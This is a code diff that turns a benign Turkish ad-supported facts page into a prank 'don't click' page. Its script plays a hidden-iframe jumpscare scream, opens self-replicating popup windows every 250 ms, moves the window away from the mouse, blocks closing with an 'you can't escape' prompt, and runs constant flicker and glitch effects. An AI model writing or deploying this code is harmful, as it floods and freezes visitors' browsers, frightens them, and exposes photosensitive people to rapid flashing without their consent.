@@ -1,92 +1,108 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hızlı Reklam Sitesi</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #f9f9f9;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        header {
-            background: #ffcc00;
-            width: 100%;
-            text-align: center;
-            padding: 20px 0;
-        }
-        h1 { margin: 0; }
-        main {
-            max-width: 800px;
-            width: 90%;
-            margin: 40px auto;
-        }
-        .content {
-            background: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            margin-bottom: 40px;
-        }
-        .ad-container {
-            margin: 30px 0;
-            width: 100%;
-        }
-        footer {
-            text-align: center;
-            margin: 40px 0;
-            color: #555;
-        }
-    </style>
+<meta charset="UTF-8">
+<title>😈</title>
+
+<style>
+body {
+    background: black;
+    color: red;
+    font-size: 40px;
+    text-align: center;
+    margin-top: 20%;
+    font-family: Arial;
+    animation: flicker 0.15s infinite;
+}
+button {
+    font-size: 30px;
+    padding: 20px;
+    cursor: pointer;
+    background: red;
+    color: black;
+    border: none;
+}
+iframe {
+    display: none;
+}
+
+@keyframes flicker {
+    0% { opacity: 1; }
+    50% { opacity: 0.7; }
+    100% { opacity: 1; }
+}
+</style>
 </head>
+
 <body>
-    <header>
-        <h1>Günlük İlginç Bilgiler</h1>
-    </header>
 
-    <main>
-        <section class="content">
-            <h2>Doğa Hakkında İlginç Bilgi</h2>
-            <p>Arılar, sadece bal yapmakla kalmaz; aynı zamanda çiçekleri dölleyerek doğanın dengesini sağlar. Bu küçük canlılar, ekosistemdeki en kritik unsurlardan biridir.</p>
-        </section>
+<div>SAKIN TIKLAMA</div>
+<button onclick="chaos()">😈</button>
 
-        <section class="ad-container">
-            <!-- Adsense reklam alanı -->
-            <ins class="adsbygoogle"
-                 style="display:block"
-                 data-ad-client="ca-pub-XXXXXX"
-                 data-ad-slot="YYYYYY"
-                 data-ad-format="auto"
-                 data-full-width-responsive="true"></ins>
-        </section>
+<!-- MyInstants FNAF jumpscare iframe -->
+<iframe
+    id="soundFrame"
+    src="https://www.myinstants.com/en/instant/fnaf-jumpscare-scream/"
+    allow="autoplay">
+</iframe>
 
-        <section class="content">
-            <h2>Ek Bilgi</h2>
-            <p>Doğada küçük canlılar büyük işler yapar. Karıncalar kolonilerinde organize olarak çalışır ve ekosistemdeki dengeyi sağlar. Her biri kendi görevini eksiksiz yerine getirir.</p>
-        </section>
+<script>
+let chaosInterval;
 
-        <section class="ad-container">
-            <ins class="adsbygoogle"
-                 style="display:block"
-                 data-ad-client="ca-pub-XXXXXX"
-                 data-ad-slot="ZZZZZZ"
-                 data-ad-format="auto"
-                 data-full-width-responsive="true"></ins>
-        </section>
-    </main>
+// Rastgele pencere açma
+function chaos() {
 
-    <footer>
-        <p>© 2025 Hızlı Reklam Sitesi</p>
-    </footer>
+    // iframe yeniden yüklenir → ses tetiklenir
+    const frame = document.getElementById("soundFrame");
+    frame.src = frame.src;
 
-    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-    <script>
-        (adsbygoogle = window.adsbygoogle || []).push({});
-        (adsbygoogle = window.adsbygoogle || []).push({});
-    </script>
+    chaosInterval = setInterval(() => {
+        let w = 300;
+        let h = 200;
+
+        let x = Math.random() * (screen.availWidth - w);
+        let y = Math.random() * (screen.availHeight - h);
+
+        window.open(
+            window.location.href,
+            "",
+            `width=${w},height=${h},left=${x},top=${y}`
+        );
+    }, 250);
+
+    shakeWindow();
+}
+
+// Ana pencere titreme
+function shakeWindow() {
+    setInterval(() => {
+        let x = Math.random() * (screen.availWidth - 400);
+        let y = Math.random() * (screen.availHeight - 300);
+        window.moveTo(x, y);
+    }, 120);
+}
+
+// Mouse yaklaşınca kaç
+document.addEventListener("mousemove", () => {
+    let x = Math.random() * (screen.availWidth - 400);
+    let y = Math.random() * (screen.availHeight - 300);
+    window.moveTo(x, y);
+});
+
+// Kapatmaya çalışınca uyarı
+window.onbeforeunload = function () {
+    return "Kaçamazsın 😈";
+};
+
+// Glitch efekti
+setInterval(() => {
+    document.body.style.filter = `
+        hue-rotate(${Math.random() * 360}deg)
+        contrast(${1 + Math.random()})
+        blur(${Math.random() * 2}px)
+    `;
+}, 150);
+</script>
+
 </body>
 </html>
